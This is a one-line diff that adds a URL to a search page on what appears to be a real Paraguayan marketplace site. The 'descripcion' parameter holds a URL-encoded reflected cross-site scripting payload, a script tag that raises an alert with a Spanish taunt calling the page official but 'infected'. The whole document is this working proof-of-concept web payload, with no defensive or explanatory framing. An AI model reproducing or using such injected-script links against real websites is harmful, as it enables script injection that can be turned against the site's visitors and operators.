@@ -1,0 +1,1 @@
+https://marketplace.com.py/index.php?class=ViewProductList&method=onSearch&scrolltotop=1&descripcion=%3Cscript%3Ealert%28%22HOLA+DARI+ESTA+PAGINA+ES+OFICIAL+SOLO+QUE+INFECTADA+KKKK%22%29%3C%2Fscript%3E
